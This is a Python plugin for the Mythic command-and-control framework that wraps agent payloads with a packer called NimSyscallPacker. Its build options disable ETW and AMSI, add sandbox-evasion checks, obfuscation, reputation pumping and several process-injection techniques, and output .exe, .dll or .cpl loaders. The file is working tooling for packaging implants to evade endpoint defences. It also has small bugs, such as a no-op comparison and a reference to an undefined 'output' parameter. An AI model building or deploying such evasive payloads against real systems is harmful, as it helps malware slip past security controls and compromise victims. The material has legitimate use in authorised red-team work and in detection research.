from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import os
import tempfile
from distutils.dir_util import copy_tree
import base64
import shutil
import pathlib
import zipfile

class NimSyscallPackerWrapper(PayloadType):
    name = "nimsyscallpacker_wrapper"
    file_extension = "exe"
    author = "som3canadian"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = []
    note = "NimSyscallPacker wrapper"
    supports_dynamic_loading = False
    build_parameters = [
        BuildParameter(
            name="loader",
            parameter_type=BuildParameterType.ChooseOne,
            description="Output format. Binary: .exe, DLL: .dll, Control: .cpl",
            choices=["binary", "dll", "control"],
        ),
        BuildParameter(
            name="format",
            parameter_type=BuildParameterType.ChooseOne,
            description="Format of payload",
            choices=["--csharp", "--shellcode"],
            default_value="--csharp",
        ),
        BuildParameter(
            name="etw",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="--noETW",
        ),
        BuildParameter(
            name="amsi",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="--noAMSI",
        ),
        BuildParameter(
            name="nodinvoke",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="--noDInvoke",
        ),
        BuildParameter(
            name="dllexportfunc",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="--dllexportfunc (only for DLL output)",
        ),
        BuildParameter(
            name="nonim",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="--noNimMain (Only for DLL output)",
        ),
        BuildParameter(
            name="pump",
            parameter_type=BuildParameterType.ChooseOne,
            description="Pump type (--pump)",
            choices=["", "words", "reputation",],
        ),
        BuildParameter(
            name="obfuscate",
            parameter_type=BuildParameterType.Boolean,
            description="--obfuscate",
            default_value=False,
        ),
        BuildParameter(
            name="ruy-lopez",
            parameter_type=BuildParameterType.Boolean,
            description="--ruy-lopez",
            default_value=False,
        ),
        BuildParameter(
            name="Caro-Kann",
            parameter_type=BuildParameterType.Boolean,
            description="--Caro-Kann",
            default_value=False,
        ),
        BuildParameter(
            name="Caro-Kann-Thread",
            parameter_type=BuildParameterType.Boolean,
            description="--Caro-Kann-Thread",
            default_value=False,
        ),
        BuildParameter(
            name="sleep",
            parameter_type=BuildParameterType.String,
            description="--sleep",
            default_value="10",
        ),
        BuildParameter(
            name="sandbox",
            parameter_type=BuildParameterType.ChooseOne,
            description="--sandbox",
            choices=["", "Domain", "DomainJoined", "DiskSpace", "MemorySpace", "Emulated", "WindowChanges"],
        ),
        BuildParameter(
            name="domain",
            parameter_type=BuildParameterType.String,
            description="--domain (ex: acme.local)(only with --sandbox Domain)",
            default_value="",
        ),
        BuildParameter(
            name="shellcodeFile",
            parameter_type=BuildParameterType.String,
            description="--shellcodeFile (ex: shellcodeFile.txt,C:\\\\temp\\\\shellcodeFile.txt)",
            default_value="",
        ),
        BuildParameter(
            name="large",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="--large",
        ),
        BuildParameter(
            name="reflective",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="--reflective",
        ),
        BuildParameter(
            name="remoteinject",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="--remoteinject",
        ),
        BuildParameter(
            name="threadless",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="--threadless",
        ),
        BuildParameter(
            name="QueueApc",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="--QueueApc",
        ),
        BuildParameter(
            name="localCreateThread",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="--localCreateThread",
        ),
        BuildParameter(
            name="CallbackExecute",
            parameter_type=BuildParameterType.Boolean,
            default_value=False,
            description="--CallbackExecute",
        ),
        BuildParameter(
            name="other",
            parameter_type=BuildParameterType.String,
            description="Other options to pass to NimSyscallPacker that are not yet implemented(ex: --poolparty 3)",
            default_value="",
        ),
        BuildParameter(
            name="input-file-extension",
            parameter_type=BuildParameterType.String,
            description="Input file extension. Should match the extension of the payload you will select on the next page. (ex: exe for apollo.exe, bin for apollo.bin and zip)",
            default_value="exe",
        ),
    ]
    # agent_path = pathlib.Path(".") / "nimsyscallpacker_wrapper" / "mythic"
    # agent_path = Path(".")
    agent_path = pathlib.Path(".") / "mythic"
    agent_icon_path = agent_path / "nimsyscallpacker_wrapper.svg"
    agent_code_path = pathlib.Path(".") / "agent_code"
    c2_profiles = []
    build_steps = [
        BuildStep(step_name="getting_agent_payload", step_description="Get the agent payload that will be wrapped"),
        BuildStep(step_name="unzipping_payload", step_description="Unzipping payload"),
        BuildStep(step_name="building_wrapper", step_description="Building wrapper payload"),
        BuildStep(step_name="Zip", step_description="Zipping payload")
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Error)
        output = ""
        #
        try:
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid).name
            # shutil to copy payload files over
            # copy_tree(str(self.agent_code_path), agent_build_path)
            copy_tree(self.agent_code_path, agent_build_path)
            #
            # dummy input file (file produced by the agent)
            source_file = "{}/SomeFile.{}".format(agent_build_path, self.get_parameter("input-file-extension"))
            with open(str(source_file), "wb") as f:
                f.write(base64.b64decode(self.wrapped_payload))
            # if working_path is not null, then we have a file to work with
            if not os.path.exists(source_file):
                resp.build_stderr = "Failed to find the payload to wrap!"
                return resp
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="getting_agent_payload",
                StepStdout="We found the payload to wrap!",
                StepSuccess=True
            ))

            # check if input-file-extension is a zip file. If so, extract the zip file
            if self.get_parameter("input-file-extension") == "zip":
                # create temp directory called agent_build_temp
                agent_build_temp = tempfile.TemporaryDirectory(suffix=self.uuid).name
                # extract zip file to temp directory
                with zipfile.ZipFile(source_file, 'r') as zip_ref:
                    zip_ref.extractall(agent_build_path)
                # check if extracted zip file contains a .exe file. If so, set input-file-extension to exe and copy the exe file to agent_code_path
                for file in os.listdir(agent_build_path):
                    if file.endswith(".exe"):
                        source_file = "{}/{}".format(agent_build_path, file)
                        shutil.copy(source_file, self.agent_code_path)
                        self.get_parameter("input-file-extension") == "exe"
                        break

                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="unzipping_payload",
                    StepStdout="Payload unzipped!",
                    StepSuccess=True
                ))

            name = format(self.get_parameter("output")) if self.get_parameter("output") != "" else "SomeFile"
            if self.get_parameter("loader") == "control":
                extension = ".cpl"
            elif self.get_parameter("loader") == "binary":
                # names = ["Excel", "Word", "Outlook", "Powerpnt", "lync", "cmd", "OneDrive", "OneNote"]
                extension = ".exe"
            elif self.get_parameter("loader") == "dll":
                extension = ".dll"
            elif self.get_parameter("loader") == "XLL":
                extension = ".xll"
            else:
                raise Exception(f"Unknown loader parameter: {self.get_parameter('loader')}")

            output_name = "SomeFile" + extension
            # if obfuscate is True, filename is Loader
            if self.get_parameter("obfuscate"):
                output_name = "Loader" + extension
            #
            #
            if self.get_parameter("loader") != "dll" and self.get_parameter("dllexportfunc"):
                resp.build_stderr = "Cannot use DllExportFunc option with a loader type other than DLL!"
                return resp
            if self.get_parameter("loader") != "dll" and self.get_parameter("nonim") == "True":
                resp.build_stderr = "Cannot use NoNimMain option with a loader type other than DLL!"
                return resp
            if self.get_parameter("loader") == "dll" and not self.get_parameter("dllexportfunc"):
                resp.build_stderr = "DLL loader requires DllExportFunc option to be set!"
                return resp
            if self.get_parameter("domain") and self.get_parameter("sandbox") != "Domain":
                resp.build_stderr = "Domain option must be set with '--sandbox Domain' option!"
                return resp
            # caro-kann and caro-kann-thread are mutually exclusive
            if self.get_parameter("Caro-Kann") and self.get_parameter("Caro-Kann-Thread"):
                resp.build_stderr = "Caro-Kann and Caro-Kann-Thread are mutually exclusive!"
                return resp
            # caro-kann need to be use with QueueApc ot localCreateThread or CallbackExecute or remoteinject
            if self.get_parameter("Caro-Kann") and not (self.get_parameter("QueueApc") or self.get_parameter("localCreateThread") or self.get_parameter("CallbackExecute") or self.get_parameter("remoteinject")):
                resp.build_stderr = "Caro-Kann need to be use with QueueApc or localCreateThread or CallbackExecute or remoteinject!"
                return resp
            #
            #
            # working_path = "{}/SomeFile.{}".format(agent_build_path, self.get_parameter("input-file-extension"))
            temp_input_file = "../SomeFile.{}".format(self.get_parameter("input-file-extension"))
            #
            # with open(str(working_path), "rb") as f:
            #     header = f.read(2)
            #     if header == b"\x4d\x5a":  # if PE file
            #         resp.build_stderr = "Supplied payload is a PE instead of raw shellcode."
            #         return resp
            #
            # command = "cd ./NimSyscallPacker && mkdir shared && nim c -d:noRES NimSyscallLoader.nim && ./NimSyscallLoader ".format(agent_build_path,agent_build_path)
            command = "cd ./NimSyscallPacker && mkdir shared && nim c -d:noRES NimSyscallLoader.nim && ./NimSyscallLoader "

            command += "--file {} {}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}".format(
                #
                temp_input_file,
                self.get_parameter("format"),
                " --noETW" if self.get_parameter("etw") else "",
                " --noAMSI" if self.get_parameter("amsi") else "",
                " --noDInvoke" if self.get_parameter("nodinvoke") else "",
                " --noNimMain" if self.get_parameter("nonim") else "",
                " --large" if self.get_parameter("large") else "",
                " --reflective" if self.get_parameter("reflective") else "",
                " --remoteinject" if self.get_parameter("remoteinject") else "",
                " --threadless" if self.get_parameter("threadless") else "",
                " --pump {}".format(self.get_parameter("pump")) if self.get_parameter("pump") != "" else "",
                " --dll --dllexportfunc {}".format(self.get_parameter("dllexportfunc")) if self.get_parameter(
                    "dllexportfunc") != "" else "",
                " --obfuscate" if self.get_parameter("obfuscate") else "",
                " --QueueApc" if self.get_parameter("QueueApc") else "",
                " --localCreateThread" if self.get_parameter("localCreateThread") else "",
                " --CallbackExecute" if self.get_parameter("CallbackExecute") else "",
                " --ruy-lopez" if self.get_parameter("ruy-lopez") else "",
                " --Caro-Kann" if self.get_parameter("Caro-Kann") else "",
                " --Caro-Kann-Thread" if self.get_parameter("Caro-Kann-Thread") else "",
                " --sleep {}".format(self.get_parameter("sleep")) if self.get_parameter("sleep") != "" else "",
                " --sandbox {}".format(self.get_parameter("sandbox")) if self.get_parameter("sandbox") != "" else "",
                " --domain {}".format(self.get_parameter("domain")) if self.get_parameter("domain") != "" else "",
                " --shellcodeFile {}".format(self.get_parameter("shellcodeFile")) if self.get_parameter("shellcodeFile") != "" else "",
                " --output " + output_name,
                " {}".format(self.get_parameter("other")) if self.get_parameter("other") != "" else "",
            )
            command += " && cp " + output_name + " shared/"
            # print(command)
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=agent_build_path,
            )
            stdout, stderr = await proc.communicate()
            if stdout:
                output += f"[stdout]\n{stdout.decode()}"
            if stderr:
                output += f"[stderr]\n{stderr.decode()}"

            output_path = "{}/NimSyscallPacker/shared/{}".format(agent_build_path, output_name)
            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="building_wrapper",
                StepStdout="New Packer payload created!",
                StepSuccess=True
            ))
            # if shellcodeFile is set, we need to process and compress
            if self.get_parameter("shellcodeFile") != "":
                output_path = "{}/NimSyscallPacker/packer".format(agent_build_path)
                temp_output_name_shellcodeFile = self.get_parameter("shellcodeFile")
                if "," in temp_output_name_shellcodeFile:
                    temp_output_name_shellcodeFile = temp_output_name_shellcodeFile.split(",")[0]
                output_name_shellcodeFile = temp_output_name_shellcodeFile.split("\\")[-1]
                # move output_name_shellcodeFile to shared folder
                output_path_shellcodeFile = "{}/NimSyscallPacker/shared/{}".format(agent_build_path, output_name_shellcodeFile)
                os.rename("{}/NimSyscallPacker/{}".format(agent_build_path, output_name_shellcodeFile), output_path_shellcodeFile)
                # compress shared folder
                shutil.make_archive(output_path, 'zip', "{}/NimSyscallPacker".format(agent_build_path), "shared")
                #
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Zip",
                    StepStdout="Successfully zipped payload",
                    StepSuccess=True
                ))
                output_path = output_path + ".zip"

            if os.path.exists(output_path):
                    resp.payload = open(output_path, "rb").read()
                    resp.status = BuildStatus.Success
                    resp.build_message = "Command: " + command + "\n" + "New Packer payload created! - {}".format(
                        output_name)
                    return resp

            resp.payload = b""
            resp.build_stdout = "Success, output: " + output + "\n Output path: " + output_path
            resp.build_stderr = "Failed, output: " + output + "\n Output path: " + output_path
        except Exception as e:
            raise Exception(str(e) + "\n" + output)
        return resp
